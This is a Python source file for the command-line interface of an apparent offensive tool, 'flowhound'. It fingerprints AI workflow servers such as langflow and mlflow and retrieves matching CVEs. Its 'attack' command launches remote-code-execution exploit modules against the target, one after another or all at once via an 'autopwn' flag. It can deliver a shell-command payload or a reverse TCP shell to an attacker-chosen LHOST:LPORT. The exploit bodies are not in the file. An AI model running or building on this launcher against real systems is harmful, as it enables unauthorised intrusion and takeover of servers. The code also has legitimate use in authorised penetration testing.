import logging
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import TimeoutError as FutureTimeoutError

import click

from flowhound.cli.banner import banner
from flowhound.cli.validators import validate_application, validate_proxy, validate_url
from flowhound.vulnerabilities.io.database import Database
from flowhound.vulnerabilities.io.version_detection import detect_target
from flowhound.vulnerabilities.payloads import PAYLOAD_MAP

EXPLOIT_TIMEOUT = 20
logger = logging.getLogger(__name__)


def _get_payload(cmd: str | None, reverse_shell: str | None):
    payload = None

    if cmd:
        payload = PAYLOAD_MAP["command"](cmd=cmd)
        logger.info(f"Using execute_bash_command payload: {cmd!r}")
    elif reverse_shell:
        try:
            lhost, lport_str = reverse_shell.rsplit(":", 1)
            lport = int(lport_str)
        except ValueError:
            raise click.BadParameter(
                "--reverse_shell must be formatted as LHOST:LPORT (e.g. 192.168.1.10:4444)."
            )

        if not (1 <= lport <= 65535):
            raise click.BadParameter("Port must be between 1 and 65535.")
        payload = PAYLOAD_MAP["reverse_shell"](lhost=lhost, lport=lport)
        logger.info(f"Using reverse_tcp_shell payload: {lhost}:{lport}")

    return payload


def _execute_exploit(
    exploit_module,
    base_url: str,
    username: str,
    password: str,
    proxies: dict[str, str] | None,
    payload,
    timeout: int = EXPLOIT_TIMEOUT,
) -> bool:
    """
    Executes an exploit module with a cross-platform timeout.
    """
    with ThreadPoolExecutor(max_workers=1) as executor:
        future = executor.submit(
            exploit_module.exploit,
            base_url=base_url,
            username=username,
            password=password,
            proxies=proxies,
            payload=payload,
        )
        return future.result(timeout=timeout)


@click.command(help="Launch one or more exploits against a target instance.")
@click.option(
    "--url", required=True, help="URL of target instance", callback=validate_url
)
@click.option("--username", required=False, default="", help="Target instance username")
@click.option("--password", required=False, default="", help="Target instance password")
@click.option(
    "--autopwn",
    required=False,
    is_flag=True,
    default=False,
    help="Launch all available exploits, instead of stopping at first successful attempt.",
)
@click.option(
    "--proxy",
    required=False,
    default=None,
    help="HTTP(s) proxy to use for network I/O operations",
    callback=validate_proxy,
)
@click.option(
    "--command",
    "cmd",
    required=False,
    default=None,
    help="Shell command to execute on the target (uses execute_bash_command payload).",
)
@click.option(
    "--reverse_shell",
    required=False,
    default=None,
    help="LHOST:LPORT for a reverse TCP shell payload (e.g. 192.168.1.10:4444).",
)
@click.option(
    "--application",
    required=False,
    default=None,
    help="Target application name (e.g. langflow, mlflow). Skips auto-detection when provided.",
    callback=validate_application,
)
@click.pass_context
def attack(
    ctx: click.Context,
    url: str,
    username: str,
    password: str,
    autopwn: bool,
    proxy: str,
    cmd: str | None,
    reverse_shell: str | None,
    application: str | None,
):
    banner()
    db: Database = ctx.obj
    has_credentials = False

    if cmd and reverse_shell:
        raise click.UsageError("--command and --reverse_shell are mutually exclusive.")
    if any([username, password]) and not all([username, password]):
        raise click.BadParameter(
            "`--username` and `--password` must be provided together."
        )
    elif username and password:
        has_credentials = True

    proxies = {"http": proxy, "https": proxy} if proxy else None

    # Determine payload to use
    payload = _get_payload(cmd=cmd, reverse_shell=reverse_shell)

    # Identify target application and version
    try:
        application, target_version = detect_target(
            base_url=url, proxies=proxies, application=application
        )
    except RuntimeError as e:
        raise click.ClickException(f"Error detecting target: {e!s}")

    logger.info(f"Detected {application} version {target_version}.")

    if has_credentials:
        logger.warning(
            f"{application} login credentials detected. Results will include Auth RCE exploit modules."
        )

    # Determine vulns & corresponding exploit modules
    try:
        vuln_lst = db.retrieve_vulnerabilities(
            application=application,
            target_version=target_version,
            is_auth=has_credentials,
        )
    except Exception as e:  # noqa: BLE001
        raise click.ClickException(f"Error retrieving exploits: {e!s}")

    # Fire exploits
    logger.info(
        f"{len(vuln_lst)} exploit(s) detected. Prioritizing unauth RCE exploits."
    )
    for vuln in vuln_lst:
        click.echo("")
        logger.info(
            f"Launching exploit for {vuln.cve_id} that impacts {vuln.application} versions {vuln.min_impacted_version} through {vuln.max_impacted_version}"
        )
        exploit_module = vuln.get_exploit_instance()

        try:
            result = _execute_exploit(
                exploit_module=exploit_module,
                base_url=url,
                username=username,
                password=password,
                proxies=proxies,
                payload=payload,
            )
        except FutureTimeoutError:
            logger.warning(
                f"Exploit for {vuln.cve_id} timed out after {EXPLOIT_TIMEOUT}s. Skipping."
            )
            result = False

        if not autopwn and result:
            logger.info("Exploitation successful. Stopping at first attempt.")
            break


@click.command(help="Detect target application and list known exploits.")
@click.option(
    "--url",
    required=True,
    help="URL of target instance",
    callback=validate_url,
)
@click.option(
    "--proxy",
    required=False,
    default=None,
    help="HTTP(s) proxy to use for network I/O operations",
    callback=validate_proxy,
)
@click.option(
    "--application",
    required=False,
    default=None,
    help="Target application name (e.g. langflow, mlflow). Skips auto-detection when provided.",
    callback=validate_application,
)
@click.pass_context
def sniff(
    ctx: click.Context, url: str, proxy: dict[str, str] | None, application: str | None
):
    db: Database = ctx.obj

    # Identify target application and version
    try:
        application, target_version = detect_target(
            base_url=url, proxies=proxy, application=application
        )
    except RuntimeError as e:
        raise click.ClickException(f"Error detecting target: {e!s}")

    logger.info(f"Detected {application} version {target_version}.")
    logger.info(
        f"Retrieving all known exploits for {application} version {target_version}:"
    )
    try:
        vuln_lst = db.retrieve_vulnerabilities(
            application=application, target_version=target_version, is_auth=True
        )
    except Exception as e:  # noqa: BLE001
        raise click.ClickException(f"Error retrieving exploits: {e!s}")

    for vuln in vuln_lst:
        logger.info(vuln.exploit_module)
